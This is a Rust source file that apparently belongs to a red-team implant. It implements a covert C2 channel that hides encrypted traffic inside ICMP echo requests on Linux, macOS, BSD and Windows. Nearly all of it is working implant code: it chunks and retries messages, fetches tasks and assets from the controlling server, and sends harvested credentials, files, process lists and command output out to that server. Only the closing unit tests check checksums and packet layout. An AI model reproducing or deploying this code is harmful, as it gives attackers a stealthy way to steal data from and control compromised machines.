use crate::conv;
use crate::Transport;
use anyhow::{anyhow, Context, Result};
use log::debug;
use pb::c2::*;
use pb::config::Config;
use pb::conv::*;
use prost::Message;
use std::net::Ipv4Addr;
use std::sync::mpsc::{Receiver, Sender};

const ICMP_CHUNK_SIZE: usize = 1400;

/// ICMP C2 transport — platform-abstracted ICMP Echo request/reply carrier.
#[derive(Debug, Clone)]
pub struct ICMP {
    server_addr: Ipv4Addr,
    icmp_id: u16,
}

// ── Platform-specific send/recv ──────────────────────────────────────────────

#[cfg(any(target_os = "linux", target_os = "macos"))]
mod platform {
    use super::*;

    pub fn send_recv(server: Ipv4Addr, id: u16, seq: u16, payload: &[u8]) -> Result<Vec<u8>> {
        sock_dgram(server, id, seq, payload).or_else(|_| sock_raw(server, id, seq, payload))
    }

    fn sock_dgram(server: Ipv4Addr, id: u16, seq: u16, payload: &[u8]) -> Result<Vec<u8>> {
        use libc::*;
        use std::mem;

        unsafe {
            let sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
            if sock < 0 {
                return Err(anyhow!("SOCK_DGRAM ICMP socket failed"));
            }
            let pkt = build_icmp_echo_request(id, seq, payload);
            let addr = sockaddr_in {
                sin_family: AF_INET as _,
                sin_port: 0,
                sin_addr: in_addr {
                    s_addr: u32::from(server).to_be(),
                },
                sin_zero: [0; 8],
            };
            // 5-second receive timeout
            let tv = timeval {
                tv_sec: 5,
                tv_usec: 0,
            };
            setsockopt(
                sock,
                SOL_SOCKET,
                SO_RCVTIMEO,
                &tv as *const _ as *const _,
                mem::size_of::<timeval>() as _,
            );

            let sent = sendto(
                sock,
                pkt.as_ptr() as *const _,
                pkt.len(),
                0,
                &addr as *const sockaddr_in as *const sockaddr,
                mem::size_of::<sockaddr_in>() as _,
            );
            if sent < 0 {
                close(sock);
                return Err(anyhow!("ICMP sendto failed"));
            }

            // Loop to skip kernel loopback echo-backs (which mirror our sent payload).
            // On loopback, the kernel may auto-reply before the redirector does.
            loop {
                let mut buf = vec![0u8; 65536];
                let n = recv(sock, buf.as_mut_ptr() as *mut _, buf.len(), 0);
                if n < 0 {
                    close(sock);
                    return Err(anyhow!("ICMP recv timed out or failed"));
                }
                // SOCK_DGRAM ICMP: no IP header in received buffer
                let n = n as usize;
                if n < 8 {
                    continue;
                }
                // Skip 8-byte ICMP header
                let data = buf[8..n].to_vec();
                // If data equals our sent payload, this is the kernel's loopback echo — skip it.
                if data == payload {
                    continue;
                }
                close(sock);
                return Ok(data);
            }
        }
    }

    fn sock_raw(server: Ipv4Addr, id: u16, seq: u16, payload: &[u8]) -> Result<Vec<u8>> {
        use libc::*;
        use std::mem;

        unsafe {
            let sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
            if sock < 0 {
                return Err(anyhow!("SOCK_RAW ICMP socket failed (needs CAP_NET_RAW)"));
            }
            let pkt = build_icmp_echo_request(id, seq, payload);
            let addr = sockaddr_in {
                sin_family: AF_INET as _,
                sin_port: 0,
                sin_addr: in_addr {
                    s_addr: u32::from(server).to_be(),
                },
                sin_zero: [0; 8],
            };
            let tv = timeval {
                tv_sec: 5,
                tv_usec: 0,
            };
            setsockopt(
                sock,
                SOL_SOCKET,
                SO_RCVTIMEO,
                &tv as *const _ as *const _,
                mem::size_of::<timeval>() as _,
            );

            let sent = sendto(
                sock,
                pkt.as_ptr() as *const _,
                pkt.len(),
                0,
                &addr as *const sockaddr_in as *const sockaddr,
                mem::size_of::<sockaddr_in>() as _,
            );
            if sent < 0 {
                close(sock);
                return Err(anyhow!("ICMP raw sendto failed"));
            }

            loop {
                let mut buf = vec![0u8; 65536];
                let n = recv(sock, buf.as_mut_ptr() as *mut _, buf.len(), 0);
                if n < 0 {
                    close(sock);
                    return Err(anyhow!("ICMP raw recv timed out or failed"));
                }
                let n = n as usize;
                // SOCK_RAW: received buffer includes 20-byte IP header
                if n < 28 {
                    continue;
                }
                let data = buf[28..n].to_vec();
                // Skip kernel loopback echo-backs
                if data == payload {
                    continue;
                }
                close(sock);
                return Ok(data);
            }
        }
    }
}

#[cfg(any(target_os = "freebsd", target_os = "netbsd", target_os = "openbsd"))]
mod platform {
    use super::*;

    pub fn send_recv(server: Ipv4Addr, id: u16, seq: u16, payload: &[u8]) -> Result<Vec<u8>> {
        sock_raw(server, id, seq, payload)
    }

    fn sock_raw(server: Ipv4Addr, id: u16, seq: u16, payload: &[u8]) -> Result<Vec<u8>> {
        use libc::*;
        use std::mem;

        unsafe {
            let sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
            if sock < 0 {
                return Err(anyhow!("SOCK_RAW ICMP socket failed"));
            }
            let pkt = build_icmp_echo_request(id, seq, payload);
            let addr = sockaddr_in {
                sin_family: AF_INET as sa_family_t,
                sin_port: 0,
                sin_addr: in_addr {
                    s_addr: u32::from(server).to_be(),
                },
                sin_zero: [0; 8],
            };
            let tv = timeval {
                tv_sec: 5,
                tv_usec: 0,
            };
            setsockopt(
                sock,
                SOL_SOCKET,
                SO_RCVTIMEO,
                &tv as *const _ as *const _,
                mem::size_of::<timeval>() as _,
            );
            let sent = sendto(
                sock,
                pkt.as_ptr() as *const _,
                pkt.len(),
                0,
                &addr as *const sockaddr_in as *const sockaddr,
                mem::size_of::<sockaddr_in>() as socklen_t,
            );
            if sent < 0 {
                close(sock);
                return Err(anyhow!("ICMP sendto failed"));
            }
            loop {
                let mut buf = vec![0u8; 65536];
                let n = recv(sock, buf.as_mut_ptr() as *mut _, buf.len(), 0);
                if n < 0 {
                    close(sock);
                    return Err(anyhow!("ICMP recv failed"));
                }
                let n = n as usize;
                if n < 28 {
                    continue;
                }
                let data = buf[28..n].to_vec();
                if data == payload {
                    continue;
                }
                close(sock);
                return Ok(data);
            }
        }
    }
}

#[cfg(target_os = "windows")]
mod platform {
    use super::*;

    pub fn send_recv(server: Ipv4Addr, _id: u16, _seq: u16, payload: &[u8]) -> Result<Vec<u8>> {
        icmp_send_echo2(server, payload)
    }

    fn icmp_send_echo2(server: Ipv4Addr, payload: &[u8]) -> Result<Vec<u8>> {
        use windows_sys::Win32::Foundation::HANDLE;
        use windows_sys::Win32::NetworkManagement::IpHelper::{
            IcmpCloseHandle, IcmpCreateFile, IcmpSendEcho2, ICMP_ECHO_REPLY,
        };

        const REPLY_BUF_SIZE: usize = 65536;
        const TIMEOUT_MS: u32 = 5000;

        unsafe {
            let handle: HANDLE = IcmpCreateFile();
            if handle == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
                return Err(anyhow!("IcmpCreateFile failed"));
            }

            let dest_addr = u32::from(server).to_be();
            let mut reply_buf = vec![0u8; REPLY_BUF_SIZE];

            let ret = IcmpSendEcho2(
                handle,
                std::ptr::null_mut(),
                None,
                std::ptr::null_mut(),
                dest_addr,
                payload.as_ptr() as *const _,
                payload.len() as u16,
                std::ptr::null_mut(),
                reply_buf.as_mut_ptr() as *mut _,
                reply_buf.len() as u32,
                TIMEOUT_MS,
            );

            IcmpCloseHandle(handle);

            if ret == 0 {
                return Err(anyhow!("IcmpSendEcho2 returned 0 replies"));
            }

            // Parse ICMP_ECHO_REPLY structure
            let reply = &*(reply_buf.as_ptr() as *const ICMP_ECHO_REPLY);
            let data_len = reply.DataSize as usize;
            if reply.Data.is_null() || data_len == 0 {
                return Ok(vec![]);
            }
            Ok(std::slice::from_raw_parts(reply.Data as *const u8, data_len).to_vec())
        }
    }
}

// ── ICMP packet construction ─────────────────────────────────────────────────

fn build_icmp_echo_request(id: u16, seq: u16, payload: &[u8]) -> Vec<u8> {
    let mut pkt = vec![
        8u8,
        0,
        0,
        0,
        (id >> 8) as u8,
        id as u8,
        (seq >> 8) as u8,
        seq as u8,
    ];
    pkt.extend_from_slice(payload);
    let cksum = icmp_checksum(&pkt);
    pkt[2] = (cksum >> 8) as u8;
    pkt[3] = cksum as u8;
    pkt
}

fn icmp_checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;
    while i + 1 < data.len() {
        sum += ((data[i] as u32) << 8) | data[i + 1] as u32;
        i += 2;
    }
    if i < data.len() {
        sum += (data[i] as u32) << 8;
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    !(sum as u16)
}

// ── Core exchange ─────────────────────────────────────────────────────────────

impl ICMP {
    fn send_recv_blocking(&self, pkt: &ConvPacket, seq: u16) -> Result<Vec<u8>> {
        let payload = pkt.encode_to_vec();
        platform::send_recv(self.server_addr, self.icmp_id, seq, &payload)
    }

    async fn icmp_exchange_raw(
        &mut self,
        request_data: &[u8],
        method_code: &str,
    ) -> Result<Vec<u8>> {
        if request_data.len() > conv::MAX_DATA_SIZE {
            return Err(anyhow!(
                "ICMP request data exceeds maximum size: {} bytes > {} bytes",
                request_data.len(),
                conv::MAX_DATA_SIZE
            ));
        }

        let chunk_size = ICMP_CHUNK_SIZE;
        let chunks = conv::split_into_chunks(request_data, chunk_size);
        let total = chunks.len();
        let crc = conv::calculate_crc32(request_data);
        let conv_id = conv::generate_conv_id();
        let mut seq: u16 = 1;

        // INIT
        let init_data =
            conv::encode_init_payload(method_code, total as u32, crc, request_data.len() as u32);
        let init_pkt = conv::build_conv_packet(PacketType::Init, 0, &conv_id, init_data, 0);
        let init_response = self
            .send_recv_blocking(&init_pkt, seq)
            .with_context(|| format!("ICMP INIT failed for conv_id={}", conv_id))?;
        debug!(
            "[icmp] conv_id={} INIT sent method={} total_chunks={} response_size={}",
            conv_id,
            method_code,
            total,
            init_response.len()
        );
        seq += 1;

        // DATA — windowed concurrent send (mirrors DNS send_data_chunks_concurrent).
        // Each spawn_blocking task opens its own raw socket; the OS demultiplexes
        // incoming replies to the correct socket via the random icmp_id per ICMP instance.
        use std::collections::{HashMap, HashSet};
        let mut acknowledged: HashSet<u32> = HashSet::new();
        let mut retry_counts: HashMap<u32, usize> = HashMap::new();
        let mut nack_set: HashSet<u32> = HashSet::new();

        let mut send_tasks = Vec::new();
        for (i, chunk) in chunks.iter().enumerate() {
            let chunk_seq = (i + 1) as u32;
            let crc32 = conv::calculate_crc32(chunk);
            let data_pkt = conv::build_conv_packet(
                PacketType::Data,
                chunk_seq,
                &conv_id,
                chunk.clone(),
                crc32,
            );
            let self_clone = self.clone();
            let pkt_clone = data_pkt.clone();
            let task_seq = seq;
            let task = tokio::task::spawn_blocking(move || {
                let resp = self_clone.send_recv_blocking(&pkt_clone, task_seq)?;
                Ok::<(u32, Vec<u8>), anyhow::Error>((chunk_seq, resp))
            });
            send_tasks.push(task);
            seq = seq.wrapping_add(1);

            // Drain oldest task when window is full
            if send_tasks.len() >= conv::SEND_WINDOW_SIZE {
                if let Some(task) = send_tasks.first_mut() {
                    if let Ok(result) = task.await {
                        Self::handle_chunk_result(
                            result,
                            &mut acknowledged,
                            &mut nack_set,
                            &conv_id,
                            total,
                        );
                    }
                    send_tasks.remove(0);
                }
            }
        }
        // Drain remaining tasks
        for task in send_tasks {
            if let Ok(result) = task.await {
                Self::handle_chunk_result(
                    result,
                    &mut acknowledged,
                    &mut nack_set,
                    &conv_id,
                    total,
                );
            }
        }

        // Retry NACKed chunks
        let mut retry_nacks: HashSet<u32> = nack_set.drain().collect();
        while !retry_nacks.is_empty() {
            let mut next_nacks = HashSet::new();
            for &chunk_seq in &retry_nacks {
                let count = retry_counts.entry(chunk_seq).or_insert(0);
                if *count >= conv::MAX_RETRIES_PER_CHUNK {
                    return Err(anyhow!("ICMP chunk {} exceeded max retries", chunk_seq));
                }
                *count += 1;
                if acknowledged.contains(&chunk_seq) {
                    continue;
                }
                let chunk = &chunks[(chunk_seq - 1) as usize];
                let crc32 = conv::calculate_crc32(chunk);
                let data_pkt = conv::build_conv_packet(
                    PacketType::Data,
                    chunk_seq,
                    &conv_id,
                    chunk.clone(),
                    crc32,
                );
                let self_clone = self.clone();
                let pkt_clone = data_pkt.clone();
                let task_seq = seq;
                let response = tokio::task::spawn_blocking(move || {
                    self_clone.send_recv_blocking(&pkt_clone, task_seq)
                })
                .await??;
                seq = seq.wrapping_add(1);
                debug!(
                    "[icmp] conv_id={} RETRY DATA sent chunk={} try={} response_size={}",
                    conv_id,
                    chunk_seq,
                    count,
                    response.len()
                );

                match conv::parse_status_response(&response) {
                    Ok((acks, nacks)) => {
                        debug!(
                            "[icmp] conv_id={} RETRY STATUS chunk={} try={} acks={:?} nacks={:?}",
                            conv_id, chunk_seq, count, acks, nacks
                        );
                        acknowledged.extend(acks.iter().copied());
                        next_nacks.extend(
                            nacks
                                .iter()
                                .filter(|&&s| !acknowledged.contains(&s))
                                .copied(),
                        );
                    }
                    Err(e) => {
                        debug!("[icmp] conv_id={} RETRY STATUS parse failed chunk={} try={}: {} (raw {} bytes: {:02x?})",
                            conv_id, chunk_seq, count, e, response.len(), &response[..response.len().min(64)]);
                        next_nacks.insert(chunk_seq);
                    }
                }
            }
            retry_nacks = next_nacks;
        }

        debug!(
            "[icmp] conv_id={} all chunks sent: acknowledged={} total={}",
            conv_id,
            acknowledged.len(),
            total
        );
        if acknowledged.len() != total {
            return Err(anyhow!(
                "ICMP: not all chunks acknowledged {}/{}",
                acknowledged.len(),
                total
            ));
        }

        // FETCH
        let fetch_pkt = conv::build_conv_packet(PacketType::Fetch, seq as u32, &conv_id, vec![], 0);
        let fetch_response = self
            .send_recv_blocking(&fetch_pkt, seq)
            .with_context(|| format!("ICMP FETCH failed for conv_id={}", conv_id))?;
        seq = seq.wrapping_add(1);

        if fetch_response.is_empty() {
            return Err(anyhow!("ICMP: server returned empty response"));
        }

        // Check for chunked response
        let response_data = if let Ok(metadata) = ResponseMetadata::decode(&fetch_response[..]) {
            if metadata.total_chunks > 0 {
                let mut full = Vec::new();
                for chunk_idx in 1..=metadata.total_chunks as usize {
                    let fp = FetchPayload {
                        chunk_index: chunk_idx as u32,
                    };
                    let fp_bytes = fp.encode_to_vec();
                    let fetch_chunk_pkt = conv::build_conv_packet(
                        PacketType::Fetch,
                        seq as u32,
                        &conv_id,
                        fp_bytes,
                        0,
                    );
                    let chunk_data = self
                        .send_recv_blocking(&fetch_chunk_pkt, seq)
                        .with_context(|| format!("ICMP FETCH chunk {} failed", chunk_idx))?;
                    seq = seq.wrapping_add(1);
                    full.extend_from_slice(&chunk_data);
                }
                // Verify reassembled CRC
                let actual_crc = conv::calculate_crc32(&full);
                if actual_crc != metadata.data_crc32 {
                    return Err(anyhow!("ICMP response CRC mismatch"));
                }
                full
            } else {
                fetch_response
            }
        } else {
            fetch_response
        };

        // COMPLETE
        let complete_pkt =
            conv::build_conv_packet(PacketType::Complete, seq as u32, &conv_id, vec![], 0);
        self.send_recv_blocking(&complete_pkt, seq)?;

        Ok(response_data)
    }
}

// ── Chunk result handler ──────────────────────────────────────────────────────

impl ICMP {
    fn handle_chunk_result(
        result: Result<(u32, Vec<u8>)>,
        acknowledged: &mut std::collections::HashSet<u32>,
        nack_set: &mut std::collections::HashSet<u32>,
        conv_id: &str,
        total: usize,
    ) {
        match result {
            Ok((chunk_seq, response)) => {
                debug!(
                    "[icmp] conv_id={} DATA sent chunk={}/{} response_size={}",
                    conv_id,
                    chunk_seq,
                    total,
                    response.len()
                );
                match conv::parse_status_response(&response) {
                    Ok((acks, nacks)) => {
                        debug!(
                            "[icmp] conv_id={} STATUS chunk={} acks={:?} nacks={:?}",
                            conv_id, chunk_seq, acks, nacks
                        );
                        acknowledged.extend(acks.iter().copied());
                        nack_set.extend(
                            nacks
                                .iter()
                                .filter(|&&s| !acknowledged.contains(&s))
                                .copied(),
                        );
                    }
                    Err(e) => {
                        debug!("[icmp] conv_id={} STATUS parse failed chunk={}: {} (raw {} bytes: {:02x?})",
                            conv_id, chunk_seq, e, response.len(), &response[..response.len().min(64)]);
                        nack_set.insert(chunk_seq);
                    }
                }
            }
            Err(e) => {
                debug!("[icmp] conv_id={} chunk task failed: {}", conv_id, e);
            }
        }
    }
}

// ── ChaCha codec helpers (mirrors dns.rs) ────────────────────────────────────

impl ICMP {
    fn marshal_with_codec<Req, Resp>(msg: Req) -> Result<Vec<u8>>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        pb::xchacha::encode_with_chacha::<Req, Resp>(msg)
    }

    fn unmarshal_with_codec<Req, Resp>(data: &[u8]) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        pb::xchacha::decode_with_chacha::<Req, Resp>(data)
    }

    async fn icmp_exchange<Req, Resp>(&mut self, request: Req, method_code: &str) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        let request_data = Self::marshal_with_codec::<Req, Resp>(request)?;
        let response_data = self.icmp_exchange_raw(&request_data, method_code).await?;
        Self::unmarshal_with_codec::<Req, Resp>(&response_data)
    }
}

// ── Transport impl ────────────────────────────────────────────────────────────

#[async_trait::async_trait]
impl Transport for ICMP {
    fn clone_box(&self) -> Box<dyn Transport + Send + Sync> {
        Box::new(self.clone())
    }

    fn init() -> Self {
        ICMP {
            server_addr: Ipv4Addr::LOCALHOST,
            icmp_id: 0,
        }
    }

    fn new(config: Config) -> Result<Self> {
        use rand::Rng;
        let uri = crate::transport::extract_uri_from_config(&config)?;
        let host = uri
            .trim_start_matches("icmp://")
            .split('/')
            .next()
            .unwrap_or("127.0.0.1");

        let server_addr: Ipv4Addr = host
            .parse()
            .with_context(|| format!("invalid ICMP server address: {}", host))?;

        let icmp_id: u16 = rand::thread_rng().gen();

        Ok(ICMP {
            server_addr,
            icmp_id,
        })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        self.icmp_exchange(request, "/c2.C2/ClaimTasks").await
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        sender: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        let response_bytes = self
            .icmp_exchange_raw(
                &Self::marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?,
                "/c2.C2/FetchAsset",
            )
            .await?;

        let mut offset = 0;
        while offset < response_bytes.len() {
            if offset + 4 > response_bytes.len() {
                break;
            }
            let chunk_len = u32::from_be_bytes([
                response_bytes[offset],
                response_bytes[offset + 1],
                response_bytes[offset + 2],
                response_bytes[offset + 3],
            ]) as usize;
            offset += 4;
            if offset + chunk_len > response_bytes.len() {
                return Err(anyhow!(
                    "Invalid chunk length: {} bytes at offset {}, total size {}",
                    chunk_len,
                    offset - 4,
                    response_bytes.len()
                ));
            }
            let encrypted_chunk = &response_bytes[offset..offset + chunk_len];
            let chunk_response = Self::unmarshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(
                encrypted_chunk,
            )?;
            sender
                .send(chunk_response)
                .map_err(|_| anyhow!("receiver dropped"))?;
            offset += chunk_len;
        }

        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        self.icmp_exchange(request, "/c2.C2/ReportCredential").await
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        let handle = tokio::spawn(async move {
            let mut all_chunks = Vec::new();
            for chunk in request {
                let chunk_bytes =
                    Self::marshal_with_codec::<ReportFileRequest, ReportFileResponse>(chunk)?;

                let framed_chunk_len = 4usize
                    .checked_add(chunk_bytes.len())
                    .ok_or_else(|| anyhow!("ICMP report_file chunk size overflow"))?;
                let next_total_size = all_chunks
                    .len()
                    .checked_add(framed_chunk_len)
                    .ok_or_else(|| anyhow!("ICMP report_file payload size overflow"))?;

                if next_total_size > conv::MAX_DATA_SIZE {
                    return Err(anyhow!(
                        "ICMP report_file payload exceeds maximum size: {} bytes > {} bytes",
                        next_total_size,
                        conv::MAX_DATA_SIZE
                    ));
                }

                all_chunks.extend_from_slice(&(chunk_bytes.len() as u32).to_be_bytes());
                all_chunks.extend_from_slice(&chunk_bytes);
            }
            Ok::<Vec<u8>, anyhow::Error>(all_chunks)
        });

        let all_chunks = handle
            .await
            .context("failed to join chunk collection task")??;
        if all_chunks.is_empty() {
            return Err(anyhow!("No file data provided"));
        }

        let response_bytes = self
            .icmp_exchange_raw(&all_chunks, "/c2.C2/ReportFile")
            .await?;

        Self::unmarshal_with_codec::<ReportFileRequest, ReportFileResponse>(&response_bytes)
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        self.icmp_exchange(request, "/c2.C2/ReportProcessList")
            .await
    }

    async fn report_output(
        &mut self,
        request: ReportOutputRequest,
    ) -> Result<ReportOutputResponse> {
        self.icmp_exchange(request, "/c2.C2/ReportOutput").await
    }

    async fn reverse_shell(
        &mut self,
        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        Err(anyhow!("reverse_shell not supported over ICMP transport"))
    }

    async fn create_portal(
        &mut self,
        _rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        _tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()> {
        Err(anyhow!("create_portal not supported over ICMP transport"))
    }

    fn get_type(&mut self) -> pb::c2::transport::Type {
        pb::c2::transport::Type::TransportIcmp
    }

    fn is_active(&self) -> bool {
        self.server_addr != Ipv4Addr::UNSPECIFIED
    }

    fn name(&self) -> &'static str {
        "icmp"
    }

    fn list_available(&self) -> Vec<String> {
        vec!["icmp".to_string()]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_icmp_checksum_all_zeros() {
        // All-zero input: each 16-bit word is 0, sum is 0, one's complement is 0xFFFF.
        let data = [0u8; 8];
        assert_eq!(icmp_checksum(&data), 0xFFFF);
    }

    #[test]
    fn test_icmp_checksum_odd_length() {
        // Odd-length input: last byte is padded with a zero high byte.
        // [0x01] → word = 0x0100, sum = 0x0100, !0x0100 = 0xFEFF
        let data = [0x01u8];
        assert_eq!(icmp_checksum(&data), 0xFEFF);
    }

    #[test]
    fn test_build_icmp_echo_request_layout() {
        let id: u16 = 0x1234;
        let seq: u16 = 0x0005;
        let payload = b"hello";

        let pkt = build_icmp_echo_request(id, seq, payload);

        // Minimum size: 8-byte ICMP header + payload.
        assert_eq!(pkt.len(), 8 + payload.len());

        // Type = 8 (Echo Request), Code = 0.
        assert_eq!(pkt[0], 8);
        assert_eq!(pkt[1], 0);

        // ID in big-endian at bytes 4-5.
        assert_eq!(u16::from_be_bytes([pkt[4], pkt[5]]), id);

        // Sequence in big-endian at bytes 6-7.
        assert_eq!(u16::from_be_bytes([pkt[6], pkt[7]]), seq);

        // Payload appended after header.
        assert_eq!(&pkt[8..], payload);
    }

    #[test]
    fn test_build_icmp_echo_request_valid_checksum() {
        let pkt = build_icmp_echo_request(0xABCD, 1, b"test");

        // Verifying the embedded checksum: recalculate with checksum bytes zeroed,
        // result must equal the checksum stored in bytes 2-3.
        let stored = u16::from_be_bytes([pkt[2], pkt[3]]);

        let mut zeroed = pkt.clone();
        zeroed[2] = 0;
        zeroed[3] = 0;
        let computed = icmp_checksum(&zeroed);

        assert_eq!(stored, computed);
    }
}
